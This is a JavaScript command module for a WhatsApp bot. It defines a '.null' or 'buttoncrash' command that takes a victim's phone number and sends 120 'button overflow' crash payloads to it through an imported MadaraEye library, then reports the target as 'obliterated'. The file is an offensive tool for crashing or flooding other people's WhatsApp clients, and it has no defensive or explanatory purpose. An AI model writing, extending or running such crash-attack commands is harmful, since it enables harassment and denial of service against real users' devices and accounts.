'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');

module.exports = {
    name: 'null',
    aliases: ['button', 'buttoncrash', 'nullcrash'],
    category: 'madaraeye',
    desc: 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ — ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ',
    usage: '.null <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}null <number>\n📝 *Example:* ${prefix}null 2348012345678` 
            }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        let eye = global.getMadaraEye?.(sock);
        if (!eye) {
            eye = new MadaraEye(sock);
        }
        
        const TOTAL = 120;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        try {
            for (let i = 0; i < TOTAL; i++) {
                await eye.buttonOverflow(target);
                await bar.update(1, 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 120));
            }
            
            await bar.done(`✅ ʙᴜᴛᴛᴏɴ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
        } catch (e) {
            await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
        }
    }
};